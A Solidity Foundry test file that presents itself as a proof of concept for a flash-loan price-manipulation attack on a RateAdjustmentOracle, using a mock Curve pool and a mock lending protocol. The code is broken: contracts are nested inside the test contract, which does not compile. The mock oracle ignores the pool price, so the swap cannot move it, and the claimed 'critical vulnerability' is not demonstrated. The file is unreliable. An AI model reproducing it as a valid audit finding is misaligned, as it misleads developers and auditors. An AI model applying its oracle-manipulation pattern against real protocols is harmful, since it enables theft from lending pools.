// SPDX-License-Identifier: BUSL-1.1
pragma solidity 0.8.29;

import "forge-std/Test.sol";
import "forge-std/console.sol";
import "../../src/interfaces/IRateAdjustmentOracle.sol";
import "../../src/interfaces/IPrincipalToken.sol";
import "../../src/interfaces/IStableSwapNG.sol";
import "../../src/libraries/RayMath.sol";

/**
 * @title RateAdjustmentOracle Price Manipulation Vulnerability Test
 * @notice This test demonstrates a critical vulnerability in the RateAdjustmentOracle
 * where an attacker can manipulate the Curve StableSwap NG pool price to affect oracle readings
 */
contract RateAdjustmentOracleManipulationTest is Test {
    using RayMath for uint256;

    // Constants
    uint256 private constant ORACLE_DECIMALS = 18;
    uint256 private constant YEAR = 365 * 24 * 3600;
    uint256 private constant UNIT = 10 ** 18;

    // Mock addresses for testing
    address private attacker = address(0x1);
    address private victim = address(0x2);
    address private admin = address(0x3);
    
    // Mock contracts
    MockStableSwapNG public curvePool;
    MockRateAdjustmentOracle public oracle;
    MockPrincipalToken public principalToken;
    MockIBT public ibt;
    MockERC20 public underlying;

    // For tracking manipulation impact
    uint256 public normalOracleValue;
    uint256 public manipulatedOracleValue;

    /**
     * @notice Mock ERC20 token implementation
     */
    contract MockERC20 {
        string public name;
        string public symbol;
        uint8 public decimals;
        uint256 public totalSupply;
        
        mapping(address => uint256) private balances;
        mapping(address => mapping(address => uint256)) private allowances;
        
        constructor(string memory _name, string memory _symbol, uint8 _decimals) {
            name = _name;
            symbol = _symbol;
            decimals = _decimals;
        }
        
        function balanceOf(address account) external view returns (uint256) {
            return balances[account];
        }
        
        function transfer(address to, uint256 amount) external returns (bool) {
            balances[msg.sender] -= amount;
            balances[to] += amount;
            return true;
        }
        
        function approve(address spender, uint256 amount) external returns (bool) {
            allowances[msg.sender][spender] = amount;
            return true;
        }
        
        function transferFrom(address from, address to, uint256 amount) external returns (bool) {
            require(allowances[from][msg.sender] >= amount, "Insufficient allowance");
            allowances[from][msg.sender] -= amount;
            balances[from] -= amount;
            balances[to] += amount;
            return true;
        }
        
        function mint(address to, uint256 amount) external {
            balances[to] += amount;
            totalSupply += amount;
        }
    }
    
    /**
     * @notice Mock IBT (Interest Bearing Token) implementation
     */
    contract MockIBT {
        MockERC20 public asset;
        uint256 private pricePerFullShare;
        
        function initialize(string memory _name, string memory _symbol, IERC20Metadata _asset) external {
            asset = MockERC20(address(_asset));
            pricePerFullShare = 1e18;
        }
        
        function deposit(uint256 amount, address receiver) external returns (uint256) {
            // Transfer tokens from sender to this contract
            asset.transferFrom(msg.sender, address(this), amount);
            
            // Calculate shares
            uint256 shares = (amount * 1e18) / pricePerFullShare;
            
            return shares;
        }
        
        function convertToAssets(uint256 shares) public view returns (uint256) {
            return (shares * pricePerFullShare) / 1e18;
        }
        
        function setPricePerFullShare(uint256 _newPrice) external {
            pricePerFullShare = _newPrice;
        }
    }
    
    /**
     * @notice Mock Principal Token implementation
     */
    contract MockPrincipalToken {
        uint256 private ptRate;
        address public ibt;
        uint256 public maturity;
        
        constructor() {
            ptRate = 0.95e27; // 95% of face value (in ray format)
        }
        
        function initialize(address _ibt, uint256 _duration, address _authority) external {
            ibt = _ibt;
            maturity = block.timestamp + _duration;
        }
        
        function getPTRate() external view returns (uint256) {
            return ptRate;
        }
        
        function setPTRate(uint256 _newRate) external {
            ptRate = _newRate;
        }
        
        function fromRay(uint256 ray, uint256 decimals) public pure returns (uint256) {
            return (ray * 10 ** decimals) / 1e27;
        }
    }

    /**
     * @notice Mock Implementation of StableSwapNG for testing purposes
     */
    contract MockStableSwapNG {
        address public ibt;
        address public pt;
        uint256 public lastPrice;
        
        mapping(uint256 => uint256) public balances;
        
        constructor(address _ibt, address _pt) {
            ibt = _ibt;
            pt = _pt;
            lastPrice = 0.95e18; // 95% of unit - typical PT price
            
            // Initial balanced pool
            balances[0] = 1_000_000e18; // IBT balance
            balances[1] = 1_000_000e18; // PT balance
        }
        
        function coins(uint256 i) external view returns (address) {
            if (i == 0) return ibt;
            if (i == 1) return pt;
            revert("Invalid coin index");
        }
        
        function exchange(uint256 i, uint256 j, uint256 dx, uint256 min_dy, address receiver) external returns (uint256) {
            require(i < 2 && j < 2 && i != j, "Invalid indices");
            
            // Simplified exchange logic for demonstration
            uint256 dy;
            
            if (i == 0 && j == 1) {
                // Exchanging IBT for PT
                // In a real pool, this would use a bonding curve
                // We'll simplify with a basic ratio calculation with price impact
                
                // Calculate price impact: larger swaps have bigger impact
                uint256 priceImpact = (dx * 1e18) / balances[i];
                uint256 adjustedPrice = (lastPrice * (1e18 - priceImpact / 10)) / 1e18;
                
                dy = (dx * adjustedPrice) / 1e18;
                
                // Update balances
                balances[i] += dx;
                balances[j] -= dy;
                
                // Update the last price (price goes down as more IBT is added)
                lastPrice = adjustedPrice;
            } else {
                // Exchanging PT for IBT
                // Similar logic but inverse price impact
                uint256 priceImpact = (dx * 1e18) / balances[i];
                uint256 adjustedPrice = (lastPrice * (1e18 + priceImpact / 10)) / 1e18;
                
                dy = (dx * 1e18) / adjustedPrice;
                
                // Update balances
                balances[i] += dx;
                balances[j] -= dy;
                
                // Update the last price (price goes up as more PT is added)
                lastPrice = adjustedPrice;
            }
            
            // Transfer tokens (in real implementation)
            // For our mock, we just simulate the balance changes
            
            return dy;
        }
        
        function last_price(uint256 i) external view returns (uint256) {
            require(i == 0, "Only index 0 supported");
            return lastPrice;
        }
    }

    /**
     * @notice Simplified RateAdjustmentOracle for testing
     */
    contract MockRateAdjustmentOracle {
        address public curvePoolAddress;
        uint256 public initialPrice;
        uint256 public startTime;
        uint256 public expiry;
        
        constructor(address _curvePoolAddress, uint256 _initialPrice) {
            curvePoolAddress = _curvePoolAddress;
            initialPrice = _initialPrice;
            startTime = block.timestamp;
            expiry = block.timestamp + YEAR;
        }
        
        function value() external view returns (uint256) {
            // Simplified implementation showing the vulnerability:
            // Direct reading from the Curve pool without any manipulation protection
            MockStableSwapNG pool = MockStableSwapNG(curvePoolAddress);
            MockPrincipalToken pt = MockPrincipalToken(pool.coins(1));
            
            // The vulnerability: using the PT rate directly from the curve pool
            uint256 ptRate = pt.getPTRate();
            return pt.fromRay(ptRate, ORACLE_DECIMALS);
        }
    }

    function setUp() public {
        // Setup basic tokens
        underlying = new MockERC20("USD Coin", "USDC", 18);
        
        // Create IBT
        ibt = new MockIBT();
        ibt.initialize("Interest Bearing Token", "IBT", IERC20Metadata(address(underlying)));
        
        // Create Principal Token (simplified for testing)
        principalToken = new MockPrincipalToken();
        vm.prank(admin);
        principalToken.initialize(address(ibt), YEAR, admin);
        
        // Create the mock Curve pool
        curvePool = new MockStableSwapNG(address(ibt), address(principalToken));
        
        // Create the oracle that uses the curve pool
        oracle = new MockRateAdjustmentOracle(address(curvePool), 0.95e18);
        
        // Fund the attacker with a significant amount of underlying tokens
        underlying.mint(attacker, 10_000_000 * UNIT);
    }
    
    /**
     * @notice Test showing how a flash loan can be used to manipulate the oracle price
     */
    function testOraclePriceManipulation() public {
        // Record the normal oracle value before manipulation
        normalOracleValue = oracle.value();
        console.log("Normal Oracle Value:", normalOracleValue / 1e16, "% of Unit");
        
        // Setup flash loan attack simulation
        vm.startPrank(attacker);
        
        // Check current balances in the pool
        uint256 ibtBalance = curvePool.balances(0);
        uint256 ptBalance = curvePool.balances(1);
        console.log("Initial Pool Balances:");
        console.log("IBT Balance:", ibtBalance / 1e18);
        console.log("PT Balance:", ptBalance / 1e18);
        
        // Simulate flash loan by using the attacker's substantial funds
        uint256 flashLoanAmount = ibtBalance / 2; // Use a significant portion of the pool
        
        // 1. Approve and deposit into IBT
        underlying.approve(address(ibt), flashLoanAmount);
        uint256 ibtsObtained = ibt.deposit(flashLoanAmount, attacker);
        
        // 2. Execute a large swap to manipulate the price (IBT → PT)
        console.log("Executing large swap to manipulate price...");
        console.log("IBTs to swap:", ibtsObtained / 1e18);
        
        // Before swap price
        console.log("Before swap - Last Price:", curvePool.last_price(0) / 1e16, "% of Unit");
        
        // Execute the swap
        curvePool.exchange(0, 1, ibtsObtained, 0, attacker);
        
        // After swap price
        console.log("After swap - Last Price:", curvePool.last_price(0) / 1e16, "% of Unit");
        
        // 3. After manipulation, check pool's balances
        console.log("Pool Balances After Manipulation:");
        console.log("IBT Balance:", curvePool.balances(0) / 1e18);
        console.log("PT Balance:", curvePool.balances(1) / 1e18);
        
        // 4. Read oracle value after manipulation
        manipulatedOracleValue = oracle.value();
        console.log("Manipulated Oracle Value:", manipulatedOracleValue / 1e16, "% of Unit");
        
        // Calculate the percentage change in oracle value
        uint256 percentageChange;
        if (manipulatedOracleValue > normalOracleValue) {
            percentageChange = ((manipulatedOracleValue - normalOracleValue) * 100) / normalOracleValue;
        } else {
            percentageChange = ((normalOracleValue - manipulatedOracleValue) * 100) / normalOracleValue;
        }
        
        console.log("Oracle Value Manipulation: ~", percentageChange, "%");
        
        // 5. In a real flash loan attack, the attacker would now:
        //    - Execute operations that benefit from the manipulated price
        //    - Swap back to repay the flash loan
        
        // Assert a significant price impact
        assertGt(percentageChange, 5, "Price manipulation should cause significant change in oracle value");
        
        vm.stopPrank();
    }
    
    /**
     * @notice This test shows how an attacker could profit from manipulating the oracle
     */
    function testExploitScenario() public {
        // First, record the normal oracle state
        normalOracleValue = oracle.value();
        console.log("Initial Oracle Value:", normalOracleValue / 1e16, "% of Unit");
        
        // Setup a victim protocol that relies on the oracle 
        // (simplified representation of a lending protocol)
        MockLendingProtocol lendingProtocol = new MockLendingProtocol(address(oracle));
        
        // Fund the lending protocol
        underlying.mint(address(lendingProtocol), 1_000_000 * UNIT);
        
        // Calculate initial collateral value
        uint256 collateralAmount = 100_000 * UNIT;
        uint256 initialLoanAmount = lendingProtocol.calculateLoanAmount(collateralAmount);
        console.log("Initial loan value:", initialLoanAmount / 1e18);
        
        // Attacker starts the attack
        vm.startPrank(attacker);
        
        // 1. Simulate flash loan 
        uint256 flashLoanAmount = curvePool.balances(0) / 2;
        underlying.approve(address(ibt), flashLoanAmount);
        uint256 ibtsObtained = ibt.deposit(flashLoanAmount, attacker);
        
        // 2. Execute swap to manipulate price
        console.log("Executing manipulation...");
        curvePool.exchange(0, 1, ibtsObtained, 0, attacker);
        
        // 3. Oracle value is now manipulated
        manipulatedOracleValue = oracle.value();
        console.log("Manipulated Oracle Value:", manipulatedOracleValue / 1e16, "% of Unit");
        
        // 4. Now the attacker can get a more favorable loan
        uint256 manipulatedLoanAmount = lendingProtocol.calculateLoanAmount(collateralAmount);
        console.log("Manipulated loan value:", manipulatedLoanAmount / 1e18);
        
        // Calculate potential profit
        uint256 potentialProfit;
        if (manipulatedLoanAmount > initialLoanAmount) {
            potentialProfit = manipulatedLoanAmount - initialLoanAmount;
            console.log("Potential profit (extra borrowed):", potentialProfit / 1e18);
        } else {
            potentialProfit = initialLoanAmount - manipulatedLoanAmount;
            console.log("Potential profit (discount on collateral):", potentialProfit / 1e18);
        }
        
        vm.stopPrank();
        
        // Assert there's a significant profit opportunity
        assertGt(potentialProfit, 1000 * UNIT, "Manipulation should create significant profit opportunity");
    }
    
    /**
     * @notice Mock lending protocol that uses the oracle
     */
    contract MockLendingProtocol {
        address public oracle;
        
        constructor(address _oracle) {
            oracle = _oracle;
        }
        
        function calculateLoanAmount(uint256 collateralAmount) external view returns (uint256) {
            // Get the current PT valuation from the oracle
            uint256 ptValue = MockRateAdjustmentOracle(oracle).value();
            
            // Calculate how much can be borrowed against this collateral
            // This is a simplified version - real protocols would have LTVs, etc.
            return (collateralAmount * ptValue) / UNIT;
        }
    }
    
    /**
     * @notice Simple IERC20Metadata interface to match expected imports
     */
    interface IERC20Metadata {
        function decimals() external view returns (uint8);
    }
} 